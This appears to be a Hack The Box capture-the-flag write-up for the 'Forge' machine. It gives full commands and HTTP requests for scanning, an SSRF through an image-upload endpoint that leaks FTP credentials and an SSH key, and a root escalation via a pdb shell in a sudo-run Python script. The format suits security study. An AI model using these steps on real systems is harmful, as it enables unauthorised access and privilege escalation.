# scanning
* `TCP` Scan
TARGET=10.10.11.111 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

21/tcp filtered ftp     no-response
22/tcp open     ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open     http    syn-ack ttl 63 Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://forge.htb

# 21 ftp

# 22 ssh

# 80 http
wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://forge.htb/" -H "Host: FUZZ.forge.htb" --hl 9
```
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                    
=====================================================================

000000024:   200        1 L      4 W        27 Ch       "admin"
```

> http://admin.forge.htb/
Only localhost is allowed! 

* upload possible
http://10.10.x.x:4444/w.php

> dirsearch -u http://forge.htb -e php,html,txt -w /usr/share/wordlists/dirb/common.txt -f
[13:49:24] 403 -  274B  - /icons/
[13:49:52] 403 -  274B  - /server-status/
[13:49:52] 403 -  274B  - /server-status
[13:49:56] 301 -  307B  - /static  ->  http://forge.htb/static/
[13:49:56] 200 -    1KB - /static/
[13:50:03] 200 -  929B  - /upload
[13:50:03] 301 -  224B  - /uploads  ->  http://forge.htb/uploads/

* send through the upload page with an obfuscated local address 127.1
```
POST /upload HTTP/1.1

Host: forge.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 31

Origin: http://forge.htb

DNT: 1

Connection: close

Referer: http://forge.htb/upload

Upgrade-Insecure-Requests: 1



url=http%3A%2F%2F127.1&remote=1
```

```
HTTP/1.1 200 OK

Date: Fri, 17 Dec 2021 01:43:19 GMT

Server: Apache/2.4.41 (Ubuntu)

Content-Disposition: inline; filename=tfWaDoVBrzPrlv5uPKwu

Content-Length: 559

Last-Modified: Fri, 17 Dec 2021 01:43:11 GMT

Cache-Control: no-cache

Connection: close

Content-Type: image/jpg



<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

> url=http%3A%2F%2FADMIN.FORGE.HTB/announcements&remote=1
```
HTTP/1.1 200 OK

Date: Fri, 17 Dec 2021 01:43:52 GMT

Server: Apache/2.4.41 (Ubuntu)

Content-Disposition: inline; filename=ZDiCm2gtMoX4wMM699pr

Content-Length: 965

Last-Modified: Fri, 17 Dec 2021 01:43:45 GMT

Cache-Control: no-cache

Connection: close

Content-Type: image/jpg



<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

* upload this url
http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.1:21/.ssh/id_rsa

* visit the image link and get the id_rsa

> ssh -i id_rsa user@10.10.11.111

# user

# pe
user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py

user@forge:~$ ls -ls /opt/remote-manage.py
4 -rwxr-xr-x 1 root root 1447 May 31  2021 /opt/remote-manage.py

```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

> sudo /usr/bin/python3 /opt/remote-manage.py


```
user@forge:~$ nc 127.0.0.1 52016
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
sssssssssssssssssssssssssssssssssssssssss
sadffffffffffffffffffffffffffffff'fsdfsdfsdfasdfasdfasdf
fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff




user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:52016
invalid literal for int() with base 10: b'sssssssssssssssssssssssssssssssssssssssss'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) import os
(Pdb) os.system('id')
uid=0(root) gid=0(root) groups=0(root)
0
(Pdb) os.system('chmod u+s /bin/bash')
0
(Pdb) quit()
user@forge:~$ bash -p
bash-5.0# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
bash-5.0# cd /root
bash-5.0# ls
clean-uploads.sh  root.txt  snap
bash-5.0# cat root.txt 
984574fbaacbd1a1a4ed38766f4f1719
bash-5.0# 

```

# root

# ref
https://medium.com/@futurembt/forge-htb-write-up-forge-hack-the-box-walkthrough-1b358c25f4ab
